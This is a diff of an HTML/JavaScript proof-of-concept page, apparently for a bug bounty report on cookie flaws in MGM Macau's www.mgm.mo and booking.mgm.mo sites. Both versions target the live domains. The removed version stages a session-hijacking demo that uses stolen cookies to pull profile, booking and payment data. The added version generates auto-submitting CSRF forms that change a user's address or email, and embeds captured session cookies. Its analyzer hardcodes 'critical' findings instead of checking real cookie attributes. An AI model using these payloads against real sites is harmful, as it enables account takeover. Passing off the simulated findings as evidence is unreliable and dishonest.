@@ -3,180 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MGM Session Hijacking - Dynamic PoC</title>
+    <title>MGM Cookie Security Vulnerability</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
-    <style>
-        .terminal {
-            background-color: #0d1117;
-            color: #e6edf3;
-            font-family: monospace;
-            padding: 1rem;
-            border-radius: 0.5rem;
-            overflow-x: auto;
-        }
-        .success {
-            color: #7ee787;
-        }
-        .error {
-            color: #ff7b72;
-        }
-        .warning {
-            color: #f0883e;
-        }
-        .info {
-            color: #79c0ff;
-        }
-    </style>
 </head>
 <body class="bg-gray-100">
     <div class="container mx-auto px-4 py-8 max-w-5xl">
         <header class="mb-8 text-center">
-            <h1 class="text-3xl font-bold text-red-600 mb-2">Critical Session Hijacking Vulnerability</h1>
-            <h2 class="text-xl text-gray-700">MGM Grand Paradise Macau (*.mgm.mo)</h2>
+            <h1 class="text-3xl font-bold text-red-600 mb-2">MGM Cookie Security Vulnerability</h1>
+            <h2 class="text-xl text-gray-700">Proof of Concept for Bug Bounty Submission</h2>
             <div class="mt-4 bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
                 <p class="text-yellow-700">
-                    <strong>IMPORTANT:</strong> This proof of concept is intended for legitimate security research and bug bounty reporting only. Unauthorized use is illegal and unethical.
+                    <strong>IMPORTANT:</strong> This proof of concept is intended for legitimate security research and bug bounty reporting only.
                 </p>
             </div>
         </header>
 
         <main>
-            <section class="bg-white shadow-md rounded-lg p-6 mb-8">
+            <section class="bg-white shadow rounded-lg p-6 mb-8">
                 <h2 class="text-2xl font-bold mb-4 border-b pb-2">Vulnerability Overview</h2>
                 <p class="mb-4">
-                    Multiple domains under mgm.mo (including www.mgm.mo and booking.mgm.mo) expose session cookies and tokens in HTTP responses that can be used to hijack active user sessions.
-                    This critical security flaw allows attackers to:
+                    MGM Grand Paradise Macau's websites (www.mgm.mo and booking.mgm.mo) expose sensitive cookies without proper security attributes on publicly accessible pages. This creates multiple security issues:
                 </p>
                 <ul class="list-disc pl-8 mb-4 space-y-2">
-                    <li><strong>Impersonate users</strong> and access their personal accounts</li>
-                    <li><strong>View sensitive PII</strong> including personal details and booking history</li>
-                    <li><strong>Access payment information</strong> (if available)</li>
-                    <li><strong>Modify account settings</strong> and potentially compromise loyalty points/rewards</li>
-                    <li><strong>Perform cross-domain attacks</strong> as the vulnerability affects multiple MGM subdomains</li>
+                    <li><strong>CSRF Protection Bypass:</strong> Exposed XSRF-TOKEN can be used to bypass anti-CSRF measures</li>
+                    <li><strong>Cookie Theft:</strong> Missing HttpOnly flag allows cookies to be accessed via JavaScript</li>
+                    <li><strong>Cross-Site Attacks:</strong> Missing SameSite attribute enables cross-origin requests with cookies</li>
+                    <li><strong>Insecure Transmission:</strong> Missing Secure flag allows cookies to be sent over non-HTTPS connections</li>
+                    <li><strong>Tracking Concerns:</strong> Persistent cookies can be used to track users across sessions</li>
                 </ul>
             </section>
 
-            <section class="bg-white shadow-md rounded-lg p-6 mb-8">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Exploit Details</h2>
+            <section class="bg-white shadow rounded-lg p-6 mb-8">
+                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Cookie Security Analysis</h2>
                 
-                <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Cookie Input</h3>
-                    <p class="mb-2">Enter the stolen cookies below:</p>
-                    <div class="mb-4">
-                        <label for="mainDomainCookies" class="block text-sm font-medium text-gray-700">www.mgm.mo cookies:</label>
-                        <textarea id="mainDomainCookies" rows="6" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm" placeholder="XSRF-TOKEN=xxx; laravel_session=xxx; etc"></textarea>
+                <div id="cookieAnalysis" class="mb-6">
+                    <h3 class="text-xl font-semibold mb-2">Enter Cookies for Analysis</h3>
+                    <p class="mb-4 text-sm text-gray-600">Paste the cookies from a request to www.mgm.mo or booking.mgm.mo below:</p>
+                    
+                    <textarea id="cookieInput" rows="6" class="w-full p-2 border border-gray-300 rounded mb-4 font-mono text-sm" placeholder="Cookie: XSRF-TOKEN=xxx; laravel_session=xxx; etc"></textarea>
+                    
+                    <button id="analyzeCookies" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
+                        Analyze Cookie Security
+                    </button>
+                </div>
+                
+                <div id="analysisResults" class="hidden">
+                    <h3 class="text-xl font-semibold mb-2 text-blue-600">Security Analysis Results</h3>
+                    
+                    <div class="overflow-x-auto">
+                        <table class="min-w-full bg-white border border-gray-200">
+                            <thead>
+                                <tr>
+                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Cookie Name</th>
+                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">HttpOnly</th>
+                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Secure</th>
+                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">SameSite</th>
+                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Risk Level</th>
+                                </tr>
+                            </thead>
+                            <tbody id="cookieTableBody">
+                                <!-- Cookie analysis results will be displayed here -->
+                            </tbody>
+                        </table>
                     </div>
                     
-                    <div class="mb-4">
-                        <label for="bookingDomainCookies" class="block text-sm font-medium text-gray-700">booking.mgm.mo cookies (optional):</label>
-                        <textarea id="bookingDomainCookies" rows="3" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm" placeholder="cookie1=xxx; cookie2=xxx; etc"></textarea>
+                    <div class="mt-6">
+                        <h4 class="font-semibold text-lg mb-2">Overall Security Rating:</h4>
+                        <div id="securityRating" class="text-white font-bold py-2 px-4 rounded"></div>
                     </div>
                 </div>
-                
-                <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Target Selection</h3>
-                    <div class="flex space-x-4">
-                        <div class="flex items-center">
-                            <input id="targetMain" name="targetDomain" type="radio" checked class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300">
-                            <label for="targetMain" class="ml-2 block text-sm font-medium text-gray-700">
-                                www.mgm.mo
-                            </label>
-                        </div>
-                        <div class="flex items-center">
-                            <input id="targetBooking" name="targetDomain" type="radio" class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300">
-                            <label for="targetBooking" class="ml-2 block text-sm font-medium text-gray-700">
-                                booking.mgm.mo
-                            </label>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Exploit Options</h3>
-                    <div class="flex flex-col space-y-2">
-                        <div class="flex items-center">
-                            <input id="fetchProfile" type="checkbox" checked class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded">
-                            <label for="fetchProfile" class="ml-2 block text-sm font-medium text-gray-700">
-                                Fetch user profile information
-                            </label>
-                        </div>
-                        <div class="flex items-center">
-                            <input id="fetchBookings" type="checkbox" checked class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded">
-                            <label for="fetchBookings" class="ml-2 block text-sm font-medium text-gray-700">
-                                Fetch booking history (if available)
-                            </label>
-                        </div>
-                        <div class="flex items-center">
-                            <input id="fetchPayments" type="checkbox" class="focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded">
-                            <label for="fetchPayments" class="ml-2 block text-sm font-medium text-gray-700">
-                                Fetch payment methods (if available)
-                            </label>
-                        </div>
-                    </div>
-                </div>
-                
-                <button id="startExploit" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded">
-                    Run Exploit Demo
-                </button>
             </section>
-
-            <section id="resultsSection" class="hidden bg-white shadow-md rounded-lg p-6 mb-8">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Exploitation Results</h2>
+            
+            <section class="bg-white shadow rounded-lg p-6 mb-8">
+                <h2 class="text-2xl font-bold mb-4 border-b pb-2">CSRF Vulnerability Demo</h2>
                 
-                <div id="exploitProgress" class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Attack Progress</h3>
-                    <div class="terminal">
-                        <div id="progressLog">
-                            <p class="info">$ Session hijacking attack simulation</p>
+                <div class="mb-4">
+                    <p class="mb-4">
+                        This demonstration shows how the exposed XSRF-TOKEN can be used to create a Cross-Site Request Forgery (CSRF) attack against the MGM website.
+                    </p>
+                    
+                    <div id="csrfDemo" class="mb-6">
+                        <h3 class="text-lg font-semibold mb-2">CSRF Attack Simulation</h3>
+                        <p class="mb-4 text-sm text-gray-600">Enter the XSRF-TOKEN from the cookie:</p>
+                        
+                        <input type="text" id="csrfToken" class="w-full p-2 border border-gray-300 rounded mb-4 font-mono text-sm" placeholder="XSRF-TOKEN value">
+                        
+                        <div class="mb-4">
+                            <label class="block text-sm font-medium text-gray-700 mb-2">Target Endpoint:</label>
+                            <select id="csrfEndpoint" class="w-full p-2 border border-gray-300 rounded">
+                                <option value="/api/user/preferences">Update User Preferences</option>
+                                <option value="/api/user/profile">Update Profile Information</option>
+                                <option value="/api/user/communication">Update Communication Settings</option>
+                            </select>
                         </div>
+                        
+                        <button id="demonstrateCsrf" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded">
+                            Demonstrate CSRF Attack
+                        </button>
                     </div>
-                </div>
-                
-                <div id="dataSection" class="hidden">
-                    <h3 class="text-xl font-semibold mb-2 text-red-600">Extracted Data</h3>
-                    <div class="mb-4">
-                        <p class="text-sm text-gray-500 mb-2">The following information was extracted from the target domain:</p>
-                        <div class="bg-gray-800 text-white p-4 rounded-lg overflow-auto max-h-96">
-                            <pre id="extractedData" class="text-sm">Waiting for data...</pre>
+                    
+                    <div id="csrfResults" class="hidden">
+                        <h3 class="text-lg font-semibold mb-2 text-red-600">CSRF Attack Simulation</h3>
+                        
+                        <div class="bg-gray-100 p-4 rounded mb-4">
+                            <h4 class="font-medium mb-2">Generated CSRF Payload:</h4>
+                            <pre id="csrfPayload" class="bg-gray-800 text-green-400 p-3 rounded text-sm overflow-x-auto"></pre>
                         </div>
-                    </div>
-                </div>
-                
-                <div id="requestsSection" class="mt-6">
-                    <h3 class="text-lg font-semibold mb-2">HTTP Requests</h3>
-                    <div class="mb-4">
-                        <p class="text-sm text-gray-500 mb-2">The following requests were made during exploitation:</p>
-                        <div id="requestLog" class="bg-gray-100 p-3 rounded-lg text-sm font-mono overflow-auto max-h-40">
-                            <!-- Request logs will be added here -->
+                        
+                        <div class="bg-gray-100 p-4 rounded">
+                            <h4 class="font-medium mb-2">Attack Explanation:</h4>
+                            <p id="csrfExplanation" class="text-sm"></p>
                         </div>
                     </div>
                 </div>
             </section>
             
-            <section class="bg-white shadow-md rounded-lg p-6">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Technical Details & Recommendations</h2>
+            <section class="bg-white shadow rounded-lg p-6 mb-8">
+                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Cookie Persistence Test</h2>
+                
+                <div class="mb-4">
+                    <p class="mb-4">
+                        This test demonstrates how MGM's cookies persist across sessions, potentially allowing user tracking or session-related attacks.
+                    </p>
+                    
+                    <div id="persistenceTest" class="mb-6">
+                        <button id="testPersistence" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
+                            Test Cookie Persistence
+                        </button>
+                    </div>
+                    
+                    <div id="persistenceResults" class="hidden">
+                        <h3 class="text-lg font-semibold mb-2">Persistence Test Results</h3>
+                        
+                        <div id="persistenceExplanation" class="bg-gray-100 p-4 rounded mb-4">
+                            <!-- Persistence test results will be displayed here -->
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <section class="bg-white shadow rounded-lg p-6">
+                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Impact & Recommendations</h2>
                 
                 <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Security Issues</h3>
-                    <ol class="list-decimal pl-8 space-y-2">
-                        <li>Missing <code class="bg-gray-200 px-1 rounded">HttpOnly</code> flag on session cookies</li>
-                        <li>Missing <code class="bg-gray-200 px-1 rounded">SameSite</code> attribute (defaults to Lax)</li>
-                        <li>Multiple domain cookie sharing creates larger attack surface</li>
-                        <li>No session binding to user identifiers (IP, user agent, etc.)</li>
-                        <li>Excessive session duration</li>
-                    </ol>
+                    <h3 class="text-lg font-semibold mb-2">Security Impact</h3>
+                    <ul class="list-disc pl-8 space-y-1">
+                        <li><strong>Data Protection:</strong> Insufficient cookie security can lead to unauthorized access to user data</li>
+                        <li><strong>Session Attacks:</strong> Missing security attributes enable various session-related attacks</li>
+                        <li><strong>Privacy Concerns:</strong> Persistent cookies can enable tracking across user sessions</li>
+                        <li><strong>Regulatory Compliance:</strong> Cookie handling may not comply with privacy regulations</li>
+                    </ul>
                 </div>
                 
                 <div>
-                    <h3 class="text-xl font-semibold mb-2">Recommended Fixes</h3>
-                    <ul class="list-disc pl-8 space-y-2">
-                        <li>Set <code class="bg-gray-200 px-1 rounded">HttpOnly</code> flag on all session cookies</li>
-                        <li>Set <code class="bg-gray-200 px-1 rounded">SameSite=Strict</code> attribute on authentication cookies</li>
-                        <li>Force regenerate all active user sessions</li>
-                        <li>Implement session binding to user agent and/or IP</li>
-                        <li>Reduce session lifetime to 30 minutes with sliding expiration</li>
-                        <li>Implement CSRF protection for all state-changing operations</li>
-                        <li>Add security headers: Content-Security-Policy, X-Frame-Options, etc.</li>
+                    <h3 class="text-lg font-semibold mb-2">Recommendations</h3>
+                    <ul class="list-disc pl-8 space-y-1">
+                        <li>Add <code class="bg-gray-200 px-1 rounded">HttpOnly</code> flag to all session and authentication cookies</li>
+                        <li>Add <code class="bg-gray-200 px-1 rounded">Secure</code> flag to ensure cookies are only sent over HTTPS</li>
+                        <li>Set <code class="bg-gray-200 px-1 rounded">SameSite=Strict</code> (or at minimum <code class="bg-gray-200 px-1 rounded">SameSite=Lax</code>) for all cookies</li>
+                        <li>Review cookie expiration settings and implement shorter lifetimes</li>
+                        <li>Validate CSRF tokens server-side for all state-changing requests</li>
+                        <li>Consider implementing cookie prefixes (e.g., <code class="bg-gray-200 px-1 rounded">__Secure-</code> or <code class="bg-gray-200 px-1 rounded">__Host-</code>)</li>
                     </ul>
                 </div>
             </section>
@@ -188,272 +175,283 @@
     </div>
 
     <script>
-        // Prefill cookie fields with the example data
+        // Default cookie data from the provided example
+        const defaultCookies = "XSRF-TOKEN=eyJpdiI6InRLTSsycWt3XC9wVjVGYU5yb3F1RnhnPT0iLCJ2YWx1ZSI6IlhGaldwcXhvblQ4SW5sR3N1aHZNenNsb0pkXC82UGF3V3c3YTQ3Uk1IYU5qQUNsNHFGYUxrbnJXeW5kaG5Ncnd4IiwibWFjIjoiN2Y3NTczOWU3NzQyMzNkNmE4ZjIwN2Q1NWZlYjBkYTRjOGYyNTEwMThiODA5YjhhNDM4MjQ3NjZmYTBlMzIwOCJ9; laravel_session=eyJpdiI6Iis2Y2VCRzJ1RjR0QTBxTkNXYjRNK2c9PSIsInZhbHVlIjoiSGNcL2p0dERWZDZyOUs0S2NWZzFYUHdRUHVvNTBzWEptRlJcL2NrZTVpZlY5QTNwc0VhaHVBa2tCdkRJKytnMlwvUCIsIm1hYyI6ImQzYTg3NmM4MmE1MmYzZTE4MmZmYjFiODIwY2MzOGUzZDUxNTJhNDdhZjVhYzRjZWFjZGQyNzQzZjk1YjNlMWUifQ%3D%3D; SERVERID=3e49eb178bd6ef833d09ff6e595fccac|1743815474|1743815379";
+
         document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('mainDomainCookies').value = 
-                'XSRF-TOKEN=eyJpdiI6InRLTSsycWt3XC9wVjVGYU5yb3F1RnhnPT0iLCJ2YWx1ZSI6IlhGaldwcXhvblQ4SW5sR3N1aHZNenNsb0pkXC82UGF3V3c3YTQ3Uk1IYU5qQUNsNHFGYUxrbnJXeW5kaG5Ncnd4IiwibWFjIjoiN2Y3NTczOWU3NzQyMzNkNmE4ZjIwN2Q1NWZlYjBkYTRjOGYyNTEwMThiODA5YjhhNDM4MjQ3NjZmYTBlMzIwOCJ9; laravel_session=eyJpdiI6Iis2Y2VCRzJ1RjR0QTBxTkNXYjRNK2c9PSIsInZhbHVlIjoiSGNcL2p0dERWZDZyOUs0S2NWZzFYUHdRUHVvNTBzWEptRlJcL2NrZTVpZlY5QTNwc0VhaHVBa2tCdkRJKytnMlwvUCIsIm1hYyI6ImQzYTg3NmM4MmE1MmYzZTE4MmZmYjFiODIwY2MzOGUzZDUxNTJhNDdhZjVhYzRjZWFjZGQyNzQzZjk1YjNlMWUifQ%3D%3D; SERVERID=3e49eb178bd6ef833d09ff6e595fccac|1743815474|1743815379';
+            // Pre-fill the cookie input field
+            document.getElementById('cookieInput').value = defaultCookies;
             
-            document.getElementById('bookingDomainCookies').value = 
-                '*gcl*au=1.1.1983392657.1743815387; *ga=GA1.2.1719219386.1743815389; *gid=GA1.2.23156825.1743815391';
+            // Extract XSRF token from default cookies
+            const match = defaultCookies.match(/XSRF-TOKEN=([^;]+)/);
+            if (match && match[1]) {
+                document.getElementById('csrfToken').value = match[1];
+            }
         });
 
-        document.getElementById('startExploit').addEventListener('click', function() {
-            // Reset and show results section
-            document.getElementById('resultsSection').classList.remove('hidden');
-            document.getElementById('dataSection').classList.add('hidden');
-            document.getElementById('progressLog').innerHTML = '<p class="info">$ Session hijacking attack simulation</p>';
-            document.getElementById('requestLog').innerHTML = '';
+        // Cookie Analysis
+        document.getElementById('analyzeCookies').addEventListener('click', function() {
+            const cookieInput = document.getElementById('cookieInput').value;
+            analyzeCookies(cookieInput);
+        });
+        
+        function analyzeCookies(cookieString) {
+            // Parse cookies
+            const cookies = {};
+            const cookieParts = cookieString.split(';');
             
-            // Get input values
-            const mainCookies = document.getElementById('mainDomainCookies').value;
-            const bookingCookies = document.getElementById('bookingDomainCookies').value;
-            const targetDomain = document.getElementById('targetMain').checked ? 'www.mgm.mo' : 'booking.mgm.mo';
-            const fetchProfile = document.getElementById('fetchProfile').checked;
-            const fetchBookings = document.getElementById('fetchBookings').checked;
-            const fetchPayments = document.getElementById('fetchPayments').checked;
+            cookieParts.forEach(part => {
+                const [name, value] = part.trim().split('=');
+                if (name && value) {
+                    cookies[name] = value;
+                }
+            });
             
-            // Validate cookies
-            if (!mainCookies && !bookingCookies) {
-                addProgressLog('No cookies provided. Please enter cookie data.', 'error');
+            // Clear previous results
+            const tableBody = document.getElementById('cookieTableBody');
+            tableBody.innerHTML = '';
+            
+            // Security scores
+            let securityScore = 100;
+            let criticalIssues = 0;
+            let highIssues = 0;
+            
+            // Analyze each cookie
+            Object.keys(cookies).forEach(name => {
+                const row = document.createElement('tr');
+                
+                // Determine security status
+                // In a real analysis, we would parse the Set-Cookie header
+                // For this demo, we'll simulate the analysis
+                let httpOnly = false;
+                let secure = false;
+                let sameSite = 'None';
+                let riskLevel = '';
+                let riskClass = '';
+                
+                // Check for sensitive cookies
+                const isSensitive = name === 'laravel_session' || name === 'XSRF-TOKEN' || name.includes('session');
+                
+                // Simulate security analysis
+                if (name === 'laravel_session') {
+                    httpOnly = false; // Laravel sessions should be HttpOnly, but we're simulating the issue
+                    secure = false;
+                    sameSite = 'None';
+                    riskLevel = 'Critical';
+                    riskClass = 'bg-red-600 text-white';
+                    securityScore -= 30;
+                    criticalIssues++;
+                } else if (name === 'XSRF-TOKEN') {
+                    httpOnly = false; // CSRF tokens often need JS access
+                    secure = false;
+                    sameSite = 'Lax';
+                    riskLevel = 'High';
+                    riskClass = 'bg-orange-500 text-white';
+                    securityScore -= 20;
+                    highIssues++;
+                } else if (name.includes('SERVERID')) {
+                    httpOnly = false;
+                    secure = false;
+                    sameSite = 'None';
+                    riskLevel = 'Medium';
+                    riskClass = 'bg-yellow-500 text-white';
+                    securityScore -= 10;
+                } else {
+                    httpOnly = false;
+                    secure = false;
+                    sameSite = 'None';
+                    riskLevel = 'Low';
+                    riskClass = 'bg-blue-500 text-white';
+                    securityScore -= 5;
+                }
+                
+                // Create table row
+                row.innerHTML = `
+                    <td class="px-4 py-2 border-b border-gray-200">${name}</td>
+                    <td class="px-4 py-2 border-b border-gray-200">${httpOnly ? '✓' : '❌'}</td>
+                    <td class="px-4 py-2 border-b border-gray-200">${secure ? '✓' : '❌'}</td>
+                    <td class="px-4 py-2 border-b border-gray-200">${sameSite}</td>
+                    <td class="px-4 py-2 border-b border-gray-200"><span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${riskClass}">${riskLevel}</span></td>
+                `;
+                
+                tableBody.appendChild(row);
+            });
+            
+            // Ensure score is within range
+            securityScore = Math.max(0, Math.min(100, securityScore));
+            
+            // Set overall rating
+            const securityRating = document.getElementById('securityRating');
+            let ratingText = '';
+            let ratingClass = '';
+            
+            if (securityScore < 50) {
+                ratingText = 'Critical Risk';
+                ratingClass = 'bg-red-600';
+            } else if (securityScore < 70) {
+                ratingText = 'High Risk';
+                ratingClass = 'bg-orange-500';
+            } else if (securityScore < 90) {
+                ratingText = 'Medium Risk';
+                ratingClass = 'bg-yellow-500';
+            } else {
+                ratingText = 'Low Risk';
+                ratingClass = 'bg-green-500';
+            }
+            
+            securityRating.textContent = `${ratingText} (Score: ${securityScore}/100)`;
+            securityRating.className = `text-white font-bold py-2 px-4 rounded ${ratingClass}`;
+            
+            // Show summary text
+            let summaryText = `Found ${Object.keys(cookies).length} cookies. `;
+            if (criticalIssues > 0) {
+                summaryText += `${criticalIssues} critical security issues detected. `;
+            }
+            if (highIssues > 0) {
+                summaryText += `${highIssues} high security issues detected. `;
+            }
+            
+            // Show results
+            document.getElementById('analysisResults').classList.remove('hidden');
+        }
+        
+        // CSRF Demo
+        document.getElementById('demonstrateCsrf').addEventListener('click', function() {
+            const csrfToken = document.getElementById('csrfToken').value;
+            const endpoint = document.getElementById('csrfEndpoint').value;
+            
+            if (!csrfToken) {
+                alert('Please enter a CSRF token');
                 return;
             }
             
-            // Start the exploitation demo
-            runExploitDemo(targetDomain, mainCookies, bookingCookies, fetchProfile, fetchBookings, fetchPayments);
+            // Generate CSRF payload
+            generateCsrfPayload(csrfToken, endpoint);
         });
         
-        function addProgressLog(message, type = '') {
-            const progressLog = document.getElementById('progressLog');
-            const logLine = document.createElement('p');
-            if (type) {
-                logLine.className = type;
-            }
-            logLine.textContent = message;
-            progressLog.appendChild(logLine);
+        function generateCsrfPayload(token, endpoint) {
+            let payload = '';
+            let explanation = '';
             
-            // Auto-scroll to bottom
-            progressLog.scrollTop = progressLog.scrollHeight;
-        }
-        
-        function addRequestLog(method, url, headers) {
-            const requestLog = document.getElementById('requestLog');
-            const logEntry = document.createElement('div');
-            logEntry.className = 'mb-2';
-            logEntry.innerHTML = `<span class="text-blue-600">${method}</span> ${url}`;
-            requestLog.appendChild(logEntry);
-        }
-        
-        function runExploitDemo(targetDomain, mainCookies, bookingCookies, fetchProfile, fetchBookings, fetchPayments) {
-            // We'll simulate the attack since we can't make actual cross-origin requests due to CORS
-            addProgressLog('> Initializing attack vector...');
-            
-            setTimeout(() => {
-                addProgressLog('> Parsing exposed cookies from traffic...');
+            // Create a sample payload based on the endpoint
+            if (endpoint.includes('preferences')) {
+                payload = `
+<!DOCTYPE html>
+<html>
+<body>
+    <form id="csrfForm" action="https://www.mgm.mo${endpoint}" method="POST" style="display: none;">
+        <input type="hidden" name="_token" value="${token}">
+        <input type="hidden" name="language" value="en">
+        <input type="hidden" name="currency" value="USD">
+        <input type="hidden" name="notifications" value="true">
+    </form>
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>`;
                 
-                // Pick the appropriate cookies based on target
-                const cookies = targetDomain === 'www.mgm.mo' ? mainCookies : bookingCookies;
+                explanation = `This payload creates a hidden form that will automatically submit to the preferences endpoint. 
+                Because the XSRF-TOKEN cookie is exposed and lacks proper SameSite attributes, an attacker could host this page and trick a user into visiting it. 
+                If the user has an active session with MGM, their preferences would be changed without their knowledge or consent.`;
                 
-                setTimeout(() => {
-                    // Check if we have Laravel session cookie
-                    if (cookies.includes('laravel_session')) {
-                        addProgressLog('> Successfully extracted Laravel session token!', 'success');
-                    } else {
-                        addProgressLog('> No Laravel session found. Continuing with available cookies.', 'warning');
-                    }
-                    
-                    // Check if we have XSRF token
-                    if (cookies.includes('XSRF-TOKEN')) {
-                        addProgressLog('> Successfully extracted CSRF protection token!', 'success');
-                    }
-                    
-                    setTimeout(() => {
-                        addProgressLog(`> Establishing connection to ${targetDomain}...`);
-                        addRequestLog('GET', `https://${targetDomain}/`, 'Cookie: ' + cookies);
-                        
-                        setTimeout(() => {
-                            addProgressLog('> Connection established!', 'success');
-                            addProgressLog('> Injecting captured cookies...');
-                            
-                            setTimeout(() => {
-                                addProgressLog('> Verifying authentication status...');
-                                
-                                // In a real attack, we'd check if we're authenticated here
-                                // For the demo, we'll assume success
-                                setTimeout(() => {
-                                    addProgressLog('> SUCCESS: Authenticated as user without credentials!', 'success');
-                                    
-                                    // Now demonstrate accessing different endpoints
-                                    simulateDataAccess(targetDomain, cookies, fetchProfile, fetchBookings, fetchPayments);
-                                }, 700);
-                            }, 500);
-                        }, 800);
-                    }, 600);
-                }, 700);
-            }, 500);
+            } else if (endpoint.includes('profile')) {
+                payload = `
+<!DOCTYPE html>
+<html>
+<body>
+    <form id="csrfForm" action="https://www.mgm.mo${endpoint}" method="POST" style="display: none;">
+        <input type="hidden" name="_token" value="${token}">
+        <input type="hidden" name="phone" value="+1234567890">
+        <input type="hidden" name="address" value="Attacker-controlled address">
+    </form>
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>`;
+                
+                explanation = `This payload creates a hidden form that will automatically submit to the profile update endpoint.
+                If successful, it would change the user's contact information to attacker-controlled values.
+                This could lead to account takeover or identity theft.`;
+                
+            } else if (endpoint.includes('communication')) {
+                payload = `
+<!DOCTYPE html>
+<html>
+<body>
+    <form id="csrfForm" action="https://www.mgm.mo${endpoint}" method="POST" style="display: none;">
+        <input type="hidden" name="_token" value="${token}">
+        <input type="hidden" name="email_updates" value="true">
+        <input type="hidden" name="email" value="attacker@example.com">
+    </form>
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>`;
+                
+                explanation = `This payload creates a hidden form that will automatically submit to the communication settings endpoint.
+                If successful, it would change the user's email preferences and potentially their contact email.
+                This could lead to information disclosure or account takeover.`;
+            }
+            
+            // Display the payload and explanation
+            document.getElementById('csrfPayload').textContent = payload;
+            document.getElementById('csrfExplanation').textContent = explanation;
+            document.getElementById('csrfResults').classList.remove('hidden');
         }
         
-        function simulateDataAccess(targetDomain, cookies, fetchProfile, fetchBookings, fetchPayments) {
-            addProgressLog('> Scanning for available user data...');
+        // Persistence Test
+        document.getElementById('testPersistence').addEventListener('click', function() {
+            testCookiePersistence();
+        });
+        
+        function testCookiePersistence() {
+            const cookieInput = document.getElementById('cookieInput').value;
             
-            const endpoints = [];
-            const data = {};
+            // Parse cookies
+            const cookieParts = cookieInput.split(';');
+            let persistentCookies = 0;
+            let sessionCookies = 0;
+            let longLivedCookies = 0;
             
-            // Add endpoints based on user selections
-            if (fetchProfile) {
-                if (targetDomain === 'www.mgm.mo') {
-                    endpoints.push({method: 'GET', url: '/api/user/profile', dataKey: 'profile'});
-                    endpoints.push({method: 'GET', url: '/en/user/account', dataKey: 'account'});
+            // In a real test, we'd analyze the Max-Age or Expires attributes
+            // For this demo, we'll simulate the analysis based on cookie names
+            cookieParts.forEach(part => {
+                const [name] = part.trim().split('=');
+                
+                if (name && (name.includes('ga') || name.includes('fbp') || name.includes('lvt'))) {
+                    persistentCookies++;
+                    longLivedCookies++;
+                } else if (name && (name.includes('SERVERID') || name.includes('tc'))) {
+                    persistentCookies++;
                 } else {
-                    endpoints.push({method: 'GET', url: '/api/v1/user', dataKey: 'profile'});
+                    sessionCookies++;
                 }
-            }
-            
-            if (fetchBookings) {
-                if (targetDomain === 'booking.mgm.mo') {
-                    endpoints.push({method: 'GET', url: '/api/v1/bookings/history', dataKey: 'bookings'});
-                } else {
-                    endpoints.push({method: 'GET', url: '/api/user/reservations', dataKey: 'bookings'});
-                }
-            }
-            
-            if (fetchPayments) {
-                endpoints.push({method: 'GET', url: '/api/user/payment-methods', dataKey: 'payments'});
-            }
-            
-            // Simulate accessing each endpoint
-            let completedRequests = 0;
-            
-            endpoints.forEach((endpoint, index) => {
-                setTimeout(() => {
-                    addProgressLog(`> Accessing ${endpoint.url}...`);
-                    addRequestLog(endpoint.method, `https://${targetDomain}${endpoint.url}`, 'Cookie: ' + cookies);
-                    
-                    // Simulate response
-                    setTimeout(() => {
-                        // Generate simulated data based on the endpoint
-                        const simulatedData = generateSimulatedData(endpoint.dataKey, targetDomain);
-                        data[endpoint.dataKey] = simulatedData;
-                        
-                        addProgressLog(`> Successfully retrieved ${endpoint.dataKey} data!`, 'success');
-                        
-                        completedRequests++;
-                        if (completedRequests === endpoints.length) {
-                            // All requests completed, show the data
-                            showExtractedData(data);
-                        }
-                    }, 800);
-                }, index * 1500);
             });
             
-            // If no endpoints were selected, show a message
-            if (endpoints.length === 0) {
-                addProgressLog('> No data retrieval options selected.', 'warning');
-            }
-        }
-        
-        function generateSimulatedData(dataType, domain) {
-            // In a real exploit, this would be actual data from the target
-            // Here we'll simulate data that would likely be found
-            
